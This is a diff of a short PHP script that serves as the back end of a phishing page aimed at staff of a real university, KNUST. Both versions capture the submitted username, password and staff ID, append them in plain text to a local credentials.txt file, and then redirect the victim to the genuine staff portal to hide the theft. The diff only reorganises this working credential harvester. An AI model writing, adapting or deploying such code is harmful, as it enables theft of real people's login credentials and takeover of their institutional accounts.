@@ -1,21 +1,18 @@
 <?php
-$file = 'credentials.txt';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $file = 'credentials.txt';
 
-// Check if all required fields are set
-if (isset($_POST['UserName'], $_POST['Password'], $_POST['StaffId'])) {
+    // Retrieve form data
     $username = $_POST['UserName'];
     $password = $_POST['Password'];
-    $staffId  = $_POST['StaffId'];
+    $staffId = $_POST['StaffId'];
 
-    // Save credentials to the file
-    file_put_contents($file, "Username: $username\nPassword: $password\nStaff ID: $staffId\n\n", FILE_APPEND);
+    // Append credentials to the file
+    $data = "Username: $username\nPassword: $password\nStaff ID: $staffId\n\n";
+    file_put_contents($file, $data, FILE_APPEND);
 
-    // Redirect to the provided link
-    $redirectUrl = "https://apps.knust.edu.gh/staff";
-    header("Location: $redirectUrl");
-    exit; // Stop further script execution after redirect
-} else {
-    // If fields are missing, display an error message
-    die("Invalid input. Please go back and try again.");
+    // Redirect user to the original page
+    header("Location: https://apps.knust.edu.gh/staff");
+    exit();
 }
 ?>
